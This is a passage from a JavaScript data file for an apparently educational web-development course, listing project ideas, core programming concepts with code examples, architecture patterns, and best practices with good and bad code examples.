        'MediaRecorder API',
        'Audio processing',
        'Real-time transcription',
      ],
      challenges: [
        'Speech recognition accuracy',
        'Network requirements',
        'Privacy of audio',
        'Browser support varies',
      ],
      a11yChecklist: [
        'For deaf/HoH: visible captions + transcripts',
        'For low-vision: text-to-speech playback',
        'For cognitive: simple controls',
      ],
      extensions: [
        'AI summarization',
        'Multilingual translation',
        'Integration with note apps',
        'Voice commands',
      ],
    },
    {
      name: 'OpenSourceContributor',
      category: 'Developer tools',
      complexity: 'Advanced (4/5)',
      timeToBuild: '15-25 hours',
      buildingBlocks: ['GitHub API', 'search', 'filtering', 'authentication'],
      features: [
        'Browse open-source projects by language, topic, "good first issue"',
        'Filter by difficulty, language, topic',
        'Track your contributions across projects',
        'Project recommendation based on skills',
        'Star + watchlist',
        'Issue tracker',
        'PR helper (templates + checklists)',
        'Maintainer profiles',
      ],
      learningGoals: [
        'OAuth (GitHub authentication)',
        'API integration',
        'Search + filter UX',
        'Open-source community',
      ],
      challenges: [
        'GitHub API rate limits',
        'OAuth flow',
        'Helpful recommendations algorithm',
      ],
      a11yChecklist: [
        'Keyboard navigation',
        'Filters accessible',
        'Issue links + summaries readable',
      ],
      extensions: [
        'Auto-generate PR descriptions',
        'Track impact (lines contributed, PRs merged)',
        'Maintainer matching',
        'Sponsorship integration',
      ],
    },
    {
      name: 'AccessAuditor',
      category: 'Accessibility',
      complexity: 'Advanced (4/5)',
      timeToBuild: '20-30 hours',
      buildingBlocks: ['WCAG rules', 'DOM analysis', 'report generation', 'WebExtensions'],
      features: [
        'Scan any webpage for accessibility issues',
        'WCAG 2.1 AA + AAA checks',
        'Color contrast analyzer',
        'Keyboard navigation checker',
        'Screen reader simulation',
        'Generate accessibility report',
        'Suggest specific fixes',
        'Track over time',
      ],
      learningGoals: [
        'WCAG 2.1 deeply',
        'Accessibility testing',
        'Report generation',
        'Browser extension development',
      ],
      challenges: [
        'WCAG rules are complex',
        'False positives + negatives',
        'Performance on large pages',
        'Some rules can\'t be auto-tested (need humans)',
      ],
      a11yChecklist: [
        'Yes — eats its own dog food',
        'Multi-modal report output',
        'Accessible UI in tool itself',
      ],
      extensions: [
        'CI/CD integration',
        'Compare reports over time',
        'Auto-fix simple issues',
        'WCAG 2.2 + 3.0 coming',
      ],
    },
  ];

  // ─── Programming concepts (every concept students need) ──────────
  var PROGRAMMING_CONCEPTS = [
    {
      concept: 'Variables',
      what: 'Named storage for values.',
      analogy: 'A box with a label. The label is the variable name. The contents are the value.',
      example: 'let age = 25;\nlet name = "Alice";\nlet isStudent = true;\n\nage = 26; // Can reassign with let\n// const PI = 3.14; PI = 3.15; // Error — const can\'t reassign',
      mistakes: ['Forgetting to declare (using "var" or no keyword)', 'Reassigning const', 'Using before declaration', 'Confusing variable name with its value'],
      practiceQuestion: 'What\'s the difference between `let count = 0` and `const count = 0`?',
      whereUsed: 'Every program ever written.',
    },
    {
      concept: 'Data types',
      what: 'Categories of values: numbers, strings, booleans, objects, arrays, etc.',
      analogy: 'Like categories of objects in real life. Numbers are quantities. Strings are text. Booleans are true/false.',
      example: '// Primitives:\nlet n = 42; // number\nlet s = "hello"; // string\nlet b = true; // boolean\nlet u; // undefined\nlet nl = null; // null\n\n// Objects (reference types):\nlet arr = [1, 2, 3]; // array\nlet obj = { name: "Alice" }; // object\nlet fn = () => {}; // function',
      mistakes: ['Using string concatenation instead of arithmetic (1 + "2" === "12")', 'Confusing null + undefined', 'Type coercion surprises'],
      practiceQuestion: 'What\'s the result of `typeof null`?',
      whereUsed: 'Every program.',
    },
    {
      concept: 'Operators',
      what: 'Symbols that perform operations: +, -, *, /, %, ===, &&, ||, etc.',
      analogy: 'Math symbols extended to programming. Plus adds, equals compares, etc.',
      example: '// Arithmetic:\n5 + 3 // 8\n10 / 3 // 3.333...\n10 % 3 // 1 (remainder)\n2 ** 8 // 256 (exponent)\n\n// Comparison:\n5 === 5 // true (strict)\n5 == "5" // true (loose, coerces)\n5 !== 6 // true\n\n// Logical:\ntrue && false // false\ntrue || false // true\n!true // false\n\n// Assignment:\nx = 5\nx += 3 // shorthand for x = x + 3',
      mistakes: ['Using = (assignment) instead of === (comparison)', 'Using == (coerces) instead of === (strict)', 'Confusing logical AND/OR with bitwise'],
      practiceQuestion: 'What\'s the difference between `==` and `===`?',
      whereUsed: 'Every expression.',
    },
    {
      concept: 'Conditionals (if/else)',
      what: 'Run different code based on conditions.',
      analogy: 'If the light is red, stop. Otherwise, go.',
      example: 'if (age >= 18) {\n  console.log("Adult");\n} else if (age >= 13) {\n  console.log("Teen");\n} else {\n  console.log("Child");\n}\n\n// Ternary (single expression):\nconst label = age >= 18 ? "Adult" : "Minor";\n\n// Switch (multiple values):\nswitch (color) {\n  case "red": go(); break;\n  case "green": stop(); break;\n  default: wait();\n}',
      mistakes: ['Forgetting break in switch (fall-through)', 'Missing else for non-matched case', 'Falsy value confusion (0, "", null all falsy)'],
      practiceQuestion: 'What does `if (0)` evaluate to?',
      whereUsed: 'Every program with logic.',
    },
    {
      concept: 'Loops (for, while)',
      what: 'Repeat code multiple times.',
      analogy: 'Like a recipe that says "stir for 5 minutes" — repeat until condition is met.',
      example: '// for: known iteration count\nfor (let i = 0; i < 10; i++) {\n  console.log(i);\n}\n\n// for...of: iterate values\nfor (const fruit of ["apple", "banana"]) {\n  console.log(fruit);\n}\n\n// for...in: iterate keys\nfor (const key in { a: 1, b: 2 }) {\n  console.log(key);\n}\n\n// while: unknown count\nlet x = 100;\nwhile (x > 0) {\n  x -= 3;\n}\n\n// do...while: at least once\ndo {\n  // ...\n} while (condition);',
      mistakes: ['Infinite loops (forgot to update counter)', 'Off-by-one errors (< vs <=)', 'Modifying array while iterating'],
      practiceQuestion: 'When would you use for...of vs forEach?',
      whereUsed: 'Working with collections.',
    },
    {
      concept: 'Functions',
      what: 'Reusable blocks of code that take inputs + return outputs.',
      analogy: 'A recipe. You give it ingredients (parameters), follow steps, get a result (return value).',
      example: '// Function declaration:\nfunction add(a, b) {\n  return a + b;\n}\nadd(2, 3); // 5\n\n// Arrow function:\nconst multiply = (a, b) => a * b;\nmultiply(4, 5); // 20\n\n// Default parameters:\nfunction greet(name = "World") {\n  return `Hello, ${name}!`;\n}\ngreet(); // "Hello, World!"\n\n// Rest parameters:\nfunction sum(...nums) {\n  return nums.reduce((a, b) => a + b, 0);\n}\nsum(1, 2, 3); // 6',
      mistakes: ['Forgetting return statement', 'Forgetting parentheses to call', 'Misusing this in arrow vs regular function'],
      practiceQuestion: 'What\'s the difference between a function declaration + arrow function?',
      whereUsed: 'Code organization. Reusability.',
    },
    {
      concept: 'Arrays',
      what: 'Ordered collection of values.',
      analogy: 'Like a list. First item, second item, etc.',
      example: 'const fruits = ["apple", "banana", "cherry"];\n\n// Access:\nfruits[0]; // "apple" (zero-indexed!)\nfruits.length; // 3\n\n// Modify:\nfruits.push("date"); // add to end\nfruits.pop(); // remove from end\nfruits.unshift("almond"); // add to start\nfruits.shift(); // remove from start\nfruits[1] = "blueberry"; // assign by index\n\n// Iterate:\nfruits.forEach(f => console.log(f));\nfruits.map(f => f.toUpperCase()); // new array\nfruits.filter(f => f.length > 5); // filtered array',
      mistakes: ['Forgetting 0-indexing', 'Trying to access undefined index', 'Modifying array in forEach (use map/filter)', 'Confusing length with last index'],
      practiceQuestion: 'What\'s the last index of an array with N items?',
      whereUsed: 'Lists, collections, sequences.',
    },
    {
      concept: 'Objects',
      what: 'Key-value pairs.',
      analogy: 'Like a dictionary or a labeled box. Each piece of data has a name.',
      example: 'const user = {\n  name: "Alice",\n  age: 30,\n  email: "alice@example.com"\n};\n\n// Access:\nuser.name; // "Alice"\nuser["email"]; // "alice@example.com" — same thing\n\n// Modify:\nuser.age = 31;\nuser.role = "admin"; // add new property\ndelete user.email; // remove property\n\n// Iterate:\nObject.keys(user); // ["name", "age", "role"]\nObject.values(user); // ["Alice", 31, "admin"]\nObject.entries(user); // [["name", "Alice"], ...]\n\n// Destructuring:\nconst { name, age } = user;',
      mistakes: ['Forgetting quotes for string keys', 'Confusing dot vs bracket notation', 'Spread operator shallow copy gotcha'],
      practiceQuestion: 'How do you delete a property from an object?',
      whereUsed: 'Structured data. Almost everywhere.',
    },
    {
      concept: 'Scope',
      what: 'Where in code a variable is accessible.',
      analogy: 'A room you can enter only with the right key. Each scope is its own room.',
      example: 'let global = "I\'m everywhere";\n\nfunction outer() {\n  let outerVar = "I\'m in outer";\n  \n  function inner() {\n    let innerVar = "I\'m in inner";\n    console.log(global, outerVar, innerVar); // all accessible\n  }\n  \n  inner();\n  // innerVar; // ERROR — not in scope here\n}\n\nouter();\n// outerVar; // ERROR — not in scope here\n\n// Block scope (let/const):\nif (true) {\n  let blockVar = "I\'m in block";\n}\n// blockVar; // ERROR — not in scope here',
      mistakes: ['Trying to access variables outside their scope', 'var has function scope, not block scope (gotcha)', 'Shadowing — re-declaring a variable in inner scope'],
      practiceQuestion: 'Why is `let` better than `var` for block scope?',
      whereUsed: 'Function organization. Avoiding bugs.',
    },
    {
      concept: 'Closures',
      what: 'Functions that remember variables from their enclosing scope, even after the outer function returns.',
      analogy: 'A box that contains both code + the variables it needs. Carries those with it everywhere.',
      example: 'function makeCounter() {\n  let count = 0;\n  return function() {\n    count++;\n    return count;\n  };\n}\n\nconst counter1 = makeCounter();\nconsole.log(counter1()); // 1\nconsole.log(counter1()); // 2\n\nconst counter2 = makeCounter();\nconsole.log(counter2()); // 1 — separate count\n\n// counter1 and counter2 each have their own "private" count',
      mistakes: ['Forgetting closure preserves variable binding (changes are seen)', 'Memory leaks from large closures'],
      practiceQuestion: 'Why does counter1\'s count survive even after makeCounter returns?',
      whereUsed: 'Encapsulation. Module pattern. Memoization. Event handlers.',
    },
    {
      concept: 'Recursion',
      what: 'A function that calls itself.',
      analogy: 'Like Russian nesting dolls. Each doll opens to reveal a smaller doll.',
      example: 'function factorial(n) {\n  // BASE CASE: when to stop\n  if (n <= 1) return 1;\n  \n  // RECURSIVE CASE: smaller problem\n  return n * factorial(n - 1);\n}\n\nfactorial(5); // 5 * 4 * 3 * 2 * 1 = 120\n\n// Always need base case to prevent infinite recursion\n// Always need progress toward base case',
      mistakes: ['Forgetting base case (stack overflow)', 'Not converging to base case', 'Confusing with iteration'],
      practiceQuestion: 'What\'s the base case for the recursion above?',
      whereUsed: 'Trees, lists, divide-and-conquer algorithms.',
    },
    {
      concept: 'Asynchronous programming',
      what: 'Code that doesn\'t block. Common for network, file I/O, timers.',
      analogy: 'Like ordering pizza. You don\'t wait at the counter — you go do other things. When pizza\'s ready, you handle it.',
      example: '// Callback (older):\nfetch("/api/data", function(response) {\n  console.log(response);\n});\n\n// Promise (modern):\nfetch("/api/data")\n  .then(response => console.log(response));\n\n// async/await (cleanest):\nasync function loadData() {\n  const response = await fetch("/api/data");\n  return response.json();\n}\nloadData().then(data => console.log(data));',
      mistakes: ['Forgetting async on function with await', 'Forgetting to handle errors', 'Race conditions', 'Callback hell'],
      practiceQuestion: 'Why do we need async/await?',
      whereUsed: 'Network calls, timers, file operations.',
    },
    {
      concept: 'Error handling',
      what: 'Gracefully handle errors in code.',
      analogy: 'Like having a backup plan. If something goes wrong, what do we do?',
      example: '// try/catch:\ntry {\n  const data = JSON.parse(badJson);\n} catch (error) {\n  console.error("JSON parse failed:", error.message);\n  // Recovery: maybe use default value\n}\n\n// Throw custom errors:\nfunction divide(a, b) {\n  if (b === 0) throw new Error("Division by zero");\n  return a / b;\n}\n\n// Error in promises:\nfetch("/api")\n  .then(r => r.json())\n  .catch(err => console.error("Failed:", err));\n\n// Or with async/await:\ntry {\n  const data = await fetch("/api");\n} catch (err) {\n  console.error(err);\n}',
      mistakes: ['Silent failures (catching but doing nothing)', 'Generic error messages', 'Not handling promise rejections'],
      practiceQuestion: 'When should you catch an error vs let it propagate?',
      whereUsed: 'User input, network calls, file operations, JSON parsing.',
    },
    {
      concept: 'Recursion vs Iteration',
      what: 'Two ways to repeat: recursion uses function calls, iteration uses loops.',
      analogy: 'Recursion: tower of dolls, each one calls smaller one. Iteration: a stack of paper, you do each one.',
      example: '// Recursive sum:\nfunction sumR(arr) {\n  if (arr.length === 0) return 0;\n  return arr[0] + sumR(arr.slice(1));\n}\n\n// Iterative sum:\nfunction sumI(arr) {\n  let sum = 0;\n  for (const n of arr) sum += n;\n  return sum;\n}',
      mistakes: ['Recursion limit (stack overflow)', 'Iteration sometimes harder for tree-like data'],
      practiceQuestion: 'When is recursion clearer than iteration?',
      whereUsed: 'Algorithm design.',
    },
    {
      concept: 'Mutability + immutability',
      what: 'Mutable: can be changed. Immutable: cannot.',
      analogy: 'Mutable: a sketchpad you erase + redraw. Immutable: a finished painting.',
      example: '// Strings are immutable:\nlet s = "hello";\ns[0] = "H"; // Doesn\'t change!\nconsole.log(s); // still "hello"\ns = "Hello"; // Can reassign\n\n// Arrays + objects are mutable:\nconst arr = [1, 2, 3];\narr[0] = 99; // changes!\narr.push(4); // changes!\n\n// Immutable approach (functional):\nconst arr2 = [...arr, 4]; // new array, original unchanged',
      mistakes: ['Mutating shared state', 'Confusion about what mutation means', 'Side effects in pure functions'],
      practiceQuestion: 'Why do React + Redux require immutability?',
      whereUsed: 'Functional programming. React.',
    },
    {
      concept: 'Pure functions',
      what: 'Functions with no side effects. Same input always → same output.',
      analogy: 'Like a math function. f(2) is always the same. Doesn\'t change anything outside.',
      example: '// Pure:\nfunction add(a, b) { return a + b; }\n// add(2, 3) ALWAYS returns 5\n\n// Impure (side effect):\nlet count = 0;\nfunction increment() {\n  count++; // side effect — changes external state\n  return count;\n}\n\n// Impure (depends on external):\nfunction now() { return new Date(); }',
      mistakes: ['Pure functions can\'t use Date.now(), Math.random(), file I/O, network', 'Easier to test if pure'],
      practiceQuestion: 'Why are pure functions easier to test?',
      whereUsed: 'Functional programming. Concurrent code.',
    },
    {
      concept: 'Higher-order functions',
      what: 'Functions that take or return other functions.',
      analogy: 'Like factory machines. Some machines accept other machines as inputs or produce them.',
      example: '// Function returning a function:\nfunction multiplier(factor) {\n  return function(n) { return n * factor; };\n}\nconst double = multiplier(2);\nconst triple = multiplier(3);\ndouble(5); // 10\ntriple(5); // 15\n\n// Function taking a function:\n[1, 2, 3].map(n => n * 2); // map takes a function\n[1, 2, 3].filter(n => n > 1); // filter takes a function\n\n// Composition:\nconst pipe = (...fns) => x => fns.reduce((acc, fn) => fn(acc), x);\nconst process = pipe(\n  s => s.trim(),\n  s => s.toLowerCase(),\n  s => s.replace(/\\s+/g, "-")\n);\nprocess("  Hello World  "); // "hello-world"',
      mistakes: ['Calling instead of passing function reference', 'Forgetting that arrow functions can be HOFs too'],
      practiceQuestion: 'Why is .map() called a higher-order function?',
      whereUsed: 'Functional programming. Array methods. React props (passing callbacks).',
    },
  ];

  // ─── App architecture patterns (verbose) ──────────────────────────
  var APP_ARCHITECTURE = [
    {
      pattern: 'Single Page Application (SPA)',
      whatItIs: 'One HTML page loaded; JavaScript renders different views without page reloads.',
      pros: ['Fast navigation after initial load', 'Smooth UX', 'Easy state management'],
      cons: ['SEO challenges (SPA crawling)', 'Slow initial load', 'JS required'],
      whenUse: 'App-like experiences. Dashboards. Tools.',
      whenAvoid: 'Content-focused sites (blogs, news). SEO-critical sites.',
      examples: 'Gmail, Trello, Twitter, Facebook',
      frameworks: 'React, Vue, Angular, Svelte',
      bestFor: 'Heavily-interactive apps with logged-in users.',
    },
    {
      pattern: 'Multi-Page Application (MPA)',
      whatItIs: 'Traditional websites — each click loads a new HTML page from server.',
      pros: ['Excellent SEO', 'No JS required', 'Standard for content sites'],
      cons: ['Slower navigation (full page reload)', 'Less smooth UX'],
      whenUse: 'Content sites (blogs, news, e-commerce browsing).',
      whenAvoid: 'Highly-interactive dashboards.',
      examples: 'Wikipedia, news sites, most blogs, e-commerce browsing',
      frameworks: 'No specific — server-side templating (Django, Rails, Express + Pug)',
      bestFor: 'Sites where content discoverability + SEO matter.',
    },
    {
      pattern: 'Server-Side Rendered (SSR)',
      whatItIs: 'Pages rendered on server, then JS hydrates for interactivity.',
      pros: ['Fast first paint', 'SEO-friendly', 'Smooth subsequent navigation'],
      cons: ['Server resources needed', 'Complex setup'],
      whenUse: 'Best of both worlds — content + interactivity.',
      whenAvoid: 'Pure static sites (use SSG).',
      examples: 'Next.js apps, Nuxt apps',
      frameworks: 'Next.js (React), Nuxt (Vue), SvelteKit',
      bestFor: 'Modern web apps that need fast first paint + SEO + interactivity.',
    },
    {
      pattern: 'Static Site Generator (SSG)',
      whatItIs: 'Pre-build static HTML pages at compile time. Deploy as static files.',
      pros: ['Blazingly fast', 'Cheap hosting (CDN)', 'Excellent SEO', 'Secure (no server)'],
      cons: ['Build time can be slow for large sites', 'Less dynamic'],
      whenUse: 'Content-heavy sites that don\'t change often.',
      whenAvoid: 'Frequently-changing content. Personalized content.',
      examples: 'Documentation sites, blogs, marketing sites',
      frameworks: 'Jekyll, Hugo, Eleventy, Astro, Next.js (export)',
      bestFor: 'Performance + cost-efficient static content.',
    },
    {
      pattern: 'Jamstack',
      whatItIs: 'JavaScript + APIs + Markup. Pre-built static + dynamic via APIs.',
      pros: ['Performance', 'Scalability', 'Security', 'Developer experience'],
      cons: ['Complexity', 'Build times for large sites'],
      whenUse: 'Modern web apps that need static performance + dynamic features.',
      whenAvoid: 'Simple sites that don\'t need this complexity.',
      examples: 'Netlify-hosted sites, Vercel apps, Cloudflare Pages apps',
      frameworks: 'Next.js, Gatsby, Astro, Eleventy + APIs',
      bestFor: 'Modern web development sweet spot.',
    },
    {
      pattern: 'Microservices',
      whatItIs: 'Application broken into small, independent services that communicate over network.',
      pros: ['Independent deployment', 'Different teams can work in parallel', 'Use right tool per service'],
      cons: ['Distributed system complexity', 'Network latency', 'Operational overhead'],
      whenUse: 'Large scale. Multiple teams. Different services have different scaling needs.',
      whenAvoid: 'Small projects. Solo developers. Early stage.',
      examples: 'Netflix, Amazon, Spotify',
      frameworks: 'Each service is independent. Docker/Kubernetes orchestration.',
      bestFor: 'Large-scale systems with many teams.',
    },
    {
      pattern: 'Monolith',
      whatItIs: 'Single codebase + single deployment.',
      pros: ['Simple', 'No network overhead', 'Easy to understand', 'Faster development for small teams'],
      cons: ['Hard to scale', 'Tight coupling', 'Slow deployments at scale'],
      whenUse: 'Early stage. Small teams. Simple apps.',
      whenAvoid: 'Very large scale.',
      examples: 'Most starter projects',
      frameworks: 'Whatever your stack is',
      bestFor: 'Most projects, most of the time.',
    },
    {
      pattern: 'Serverless / Functions-as-a-Service (FaaS)',
      whatItIs: 'Run individual functions in cloud (no servers to manage).',
      pros: ['Pay only for what you use', 'Auto-scale', 'No server admin'],
      cons: ['Cold start latency', 'Vendor lock-in', 'Complex debugging'],
      whenUse: 'Variable load. Event-driven workloads.',
      whenAvoid: 'Consistent heavy traffic (gets expensive).',
      examples: 'AWS Lambda, Vercel Functions, Cloudflare Workers',
      frameworks: 'Serverless Framework, AWS SAM, Vercel',
      bestFor: 'API endpoints, image processing, background jobs.',
    },
    {
      pattern: 'BFF (Backend-for-Frontend)',
      whatItIs: 'A custom backend for each frontend (web, iOS, Android).',
      pros: ['Tailored API for each frontend\'s needs', 'Decoupled teams', 'Performance per platform'],
      cons: ['More code to maintain', 'API duplication risk'],
      whenUse: 'Multiple frontends with different needs.',
      whenAvoid: 'Single frontend.',
      examples: 'Netflix BFF pattern, large e-commerce',
      frameworks: 'Custom Express/Node BFF + microservices behind',
      bestFor: 'Multi-platform apps with different API needs.',
    },
    {
      pattern: 'Event-driven architecture',
      whatItIs: 'Services communicate via events (not direct calls).',
      pros: ['Loose coupling', 'Scalable', 'Resilient'],
      cons: ['Eventual consistency challenges', 'Complex debugging'],
      whenUse: 'Async workflows. Multiple consumers of same data.',
      whenAvoid: 'Strict consistency requirements.',
      examples: 'Order placed → inventory + notifications + analytics all react',
      frameworks: 'Kafka, RabbitMQ, AWS EventBridge',
      bestFor: 'Distributed systems with async workflows.',
    },
    {
      pattern: 'CRUD (Create, Read, Update, Delete)',
      whatItIs: 'Standard data operations exposed via REST API.',
      pros: ['Simple', 'Well-understood', 'Predictable'],
      cons: ['Limited for complex queries', 'Over-fetching possible'],
      whenUse: 'Standard data management apps.',
      whenAvoid: 'Complex queries (consider GraphQL).',
      examples: 'Admin dashboards, content management, most APIs',
      frameworks: 'Express, Django, Rails, Laravel',
      bestFor: 'Standard data-driven apps.',
    },
    {
      pattern: 'REST API',
      whatItIs: 'Resources accessed via HTTP verbs (GET, POST, PUT, DELETE).',
      pros: ['Standard', 'Cacheable', 'Stateless', 'Widely-understood'],
      cons: ['Over-fetching', 'Multiple round trips for complex data'],
      whenUse: 'Most APIs.',
      whenAvoid: 'When clients need very specific data shapes (use GraphQL).',
      examples: 'GitHub API, Twitter API, Stripe API',
      frameworks: 'Express, Django REST, Spring',
      bestFor: 'Public APIs, standard data access.',
    },
    {
      pattern: 'GraphQL',
      whatItIs: 'Query language for APIs. Clients specify exactly what data they need.',
      pros: ['No over-fetching', 'Single request for complex data', 'Type system'],
      cons: ['Complexity', 'Caching harder', 'Server complexity'],
      whenUse: 'Mobile apps that need to minimize bandwidth. Multiple clients with different needs.',
      whenAvoid: 'Simple CRUD APIs. Small teams.',
      examples: 'GitHub API v4, Facebook, Shopify, many others',
      frameworks: 'Apollo Server, GraphQL Yoga, Hasura, PostGraphile',
      bestFor: 'Complex data fetching with many client types.',
    },
    {
      pattern: 'WebSocket / Real-time',
      whatItIs: 'Persistent bi-directional connection for real-time data.',
      pros: ['Real-time updates', 'No polling', 'Bidirectional'],
      cons: ['Stateful (harder to scale)', 'Some firewalls block', 'Complexity'],
      whenUse: 'Chat, live updates, collaborative editing, multiplayer games.',
      whenAvoid: 'Standard request/response (use REST).',
      examples: 'Slack, Discord, Google Docs, multiplayer games',
      frameworks: 'Socket.io, ws, Pusher, Ably',
      bestFor: 'Real-time collaboration + push updates.',
    },
    {
      pattern: 'Progressive Web App (PWA)',
      whatItIs: 'Web app with native-app-like features (installable, offline, push notifications).',
      pros: ['Cross-platform', 'No app store gatekeeping', 'Single codebase'],
      cons: ['Less native feel', 'Limited compared to native apps'],
      whenUse: 'When you want app-like UX without native investment.',
      whenAvoid: 'Heavy native API needs.',
      examples: 'Twitter Lite, Pinterest, Starbucks PWA',
      frameworks: 'Workbox, PWA Builder',
      bestFor: 'Apps with focus on broad reach + offline capability.',
    },
    {
      pattern: 'Native mobile app',
      whatItIs: 'Apps written in platform-specific languages (Swift for iOS, Kotlin for Android).',
      pros: ['Best performance', 'Full native API access', 'Best UX', 'App store presence'],
      cons: ['Separate codebases', 'Slower development', 'Higher cost'],
      whenUse: 'Performance-critical mobile apps. Heavy use of native APIs.',
      whenAvoid: 'Simple apps where PWA or cross-platform would work.',
      examples: 'Instagram, TikTok, banking apps',
      frameworks: 'Native (Swift, Kotlin)',
      bestFor: 'Top-tier mobile experiences.',
    },
    {
      pattern: 'Cross-platform mobile (React Native, Flutter)',
      whatItIs: 'Write once, run on iOS + Android (mostly).',
      pros: ['Single codebase', 'Faster development', 'Web devs can build'],
      cons: ['Compromises on UX vs native', 'Performance not always native-level'],
      whenUse: 'Standard apps where time-to-market matters.',
      whenAvoid: 'Most performance-critical apps.',
      examples: 'Facebook, Instagram (parts), Walmart, Discord',
      frameworks: 'React Native, Flutter, Ionic',
      bestFor: 'Most mobile apps, especially when team has web skills.',
    },
    {
      pattern: 'Headless CMS',
      whatItIs: 'CMS exposes content via API; you build the frontend separately.',
      pros: ['Frontend flexibility', 'Reuse content across platforms', 'Modern dev experience'],
      cons: ['Setup complexity', 'May need multiple integrations'],
      whenUse: 'Content sites that need flexible frontends.',
      whenAvoid: 'Simple blogs (WordPress is fine).',
      examples: 'Contentful, Strapi, Sanity, Prismic',
      frameworks: 'Any frontend that calls APIs',
      bestFor: 'Marketing sites with multiple platforms.',
    },
    {
      pattern: 'Static Site + APIs',
      whatItIs: 'Build static site at compile time. Add dynamic features via APIs.',
      pros: ['Fast', 'Cheap', 'Secure', 'SEO-friendly'],
      cons: ['Build time', 'Limited dynamism'],
      whenUse: 'Blogs, marketing, docs.',
      whenAvoid: 'Apps with heavy interactivity.',
      examples: 'Most modern blogs + docs + marketing',
      frameworks: 'Next.js, Astro, Eleventy, Hugo',
      bestFor: 'Content-focused sites with selected dynamic features.',
    },
  ];

  // ─── Real-world web standards + practices (verbose) ──────────────
  var REAL_WORLD_PRACTICES = [
    {
      practice: 'Use semantic HTML',
      whatItMeans: 'Use HTML elements according to their meaning, not just appearance.',
      examples: [
        '<button> for actions, not <div onclick>',
        '<nav> for navigation, not <div class="nav">',
        '<main> for primary content',
        '<article> for self-contained content',
        '<aside> for sidebars',
        '<header> + <footer> for landmarks',
        '<form> for form sections',
      ],
      whyMatters: 'Screen readers, search engines, browsers, + future tools all rely on semantic markup. Accessibility + SEO win.',
      antiExample: '<div class="header">\n  <div class="title">Welcome</div>\n  <div class="nav">\n    <div onclick="goHome()">Home</div>\n  </div>\n</div>',
      goodExample: '<header>\n  <h1>Welcome</h1>\n  <nav>\n    <a href="/">Home</a>\n  </nav>\n</header>',
      learnMore: 'developer.mozilla.org/en-US/docs/Glossary/Semantics',
    },
    {
      practice: 'Use mobile-first responsive design',
      whatItMeans: 'Design for mobile screens first, then add complexity for larger screens.',
      examples: [
        'Default CSS targets mobile',
        '@media (min-width: 768px) for tablet+',
        '@media (min-width: 1024px) for desktop',
        'Touch targets >= 44px',
        'Use rem/em for scalable text',
      ],
      whyMatters: 'Most internet traffic is mobile. Designing mobile-first prevents bloated layouts that don\'t scale down.',
      antiExample: '/* Desktop-only thinking */\n.layout {\n  width: 1200px;\n  display: grid;\n  grid-template-columns: 1fr 1fr 1fr 1fr;\n}\n/* Has to be redone for mobile */',
      goodExample: '/* Mobile first */\n.layout {\n  display: grid;\n  grid-template-columns: 1fr;\n  padding: 16px;\n}\n@media (min-width: 768px) {\n  .layout {\n    grid-template-columns: 1fr 1fr;\n  }\n}\n@media (min-width: 1024px) {\n  .layout {\n    grid-template-columns: repeat(4, 1fr);\n  }\n}',
      learnMore: 'developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Responsive_Design',
    },
    {
      practice: 'Always have meaningful page titles',
      whatItMeans: 'Each page should have a descriptive <title>.',
      examples: [
        'Title in <head>: <title>Page name — Site name</title>',
        'Title format: specific → general',
        'Update title when content changes (SPA)',
        'Keep concise — 50-60 characters',
      ],
      whyMatters: 'Bookmarks, search results, browser history, screen reader announcements — all use the title.',
      antiExample: '<title>Untitled</title>\n<title>Document</title>\n<title>Home</title>',
      goodExample: '<title>Apple iPhone 15 Pro — Tech Specs — Apple</title>\n<title>Order #12345 Confirmation — MyShop</title>\n<title>Login — MyApp</title>',
      learnMore: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/title',
    },
    {
      practice: 'Use HTTPS in production',
      whatItMeans: 'All production sites should use HTTPS, not HTTP.',
      examples: [
        'Get free SSL cert (Let\'s Encrypt)',
        'Configure server for HTTPS',
        'Redirect HTTP to HTTPS',
        'Set HSTS header for force-HTTPS',
        'Use https:// in all internal links',
      ],
      whyMatters: 'HTTP traffic is unencrypted — anyone on network can read. HTTPS protects user privacy + integrity. Many APIs require HTTPS.',
      antiExample: '<a href="http://example.com">Link</a>\n<!-- User data sent unencrypted -->',
      goodExample: '<!-- Use HTTPS, with strict-transport-security header -->\n<link rel="preload" href="https://example.com" as="script">',
      learnMore: 'developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security',
    },
    {
      practice: 'Validate user input',
      whatItMeans: 'Never trust user input. Always validate on server-side.',
      examples: [
        'HTML5 attributes: required, pattern, minlength, maxlength',
        'Client-side: helpful UX',
        'Server-side: SECURITY (always)',
        'Use libraries: Joi, Zod, etc.',
        'Sanitize before storing or displaying',
      ],
      whyMatters: 'Client-side validation can be bypassed. Server-side prevents SQL injection, XSS, data corruption.',
      antiExample: 'function save(input) {\n  db.users.insert(input); // VULNERABLE!\n}',
      goodExample: 'function save(input) {\n  if (typeof input.email !== "string") throw new Error("Invalid email");\n  if (!emailPattern.test(input.email)) throw new Error("Invalid format");\n  // ... more validations ...\n  db.users.insert({\n    email: sanitize(input.email),\n    name: sanitize(input.name)\n  });\n}',
      learnMore: 'OWASP Input Validation Cheat Sheet',
    },
    {
      practice: 'Use environment variables for secrets',
      whatItMeans: 'Never hardcode passwords, API keys, etc. in code.',
      examples: [
        'Use .env file (gitignored)',
        'Reference: process.env.API_KEY',
        'In production: cloud provider\'s secret management',
        'Never commit .env to git',
      ],
      whyMatters: 'Hardcoded secrets in git can be public forever. Even private repos leak.',
      antiExample: 'const API_KEY = "sk-abc123def456"; // EXPOSED IN GIT!\nconst DB_PASS = "secretpass";',
      goodExample: 'const API_KEY = process.env.API_KEY;\nconst DB_PASS = process.env.DB_PASSWORD;\n\n// .env file (gitignored):\n// API_KEY=sk-abc123def456\n// DB_PASSWORD=secretpass',
      learnMore: '12 Factor App Methodology',
    },
    {
      practice: 'Write tests',
      whatItMeans: 'Automated tests for your code.',
      examples: [
        'Unit tests for individual functions',
        'Integration tests for components',
        'E2E tests for critical flows',
        'Aim for 80%+ coverage on critical code',
      ],
      whyMatters: 'Manual testing doesn\'t scale. Tests catch regressions. Confidence to refactor.',
      antiExample: '// Code with no tests. Fingers crossed!',
      goodExample: '// add.test.js\ndescribe("add", () => {\n  test("adds positive numbers", () => {\n    expect(add(2, 3)).toBe(5);\n  });\n  \n  test("handles negative", () => {\n    expect(add(-1, 1)).toBe(0);\n  });\n  \n  test("handles zero", () => {\n    expect(add(0, 0)).toBe(0);\n  });\n});',
      learnMore: 'jestjs.io, testing-library.com',
    },
    {
      practice: 'Use a code formatter (Prettier)',
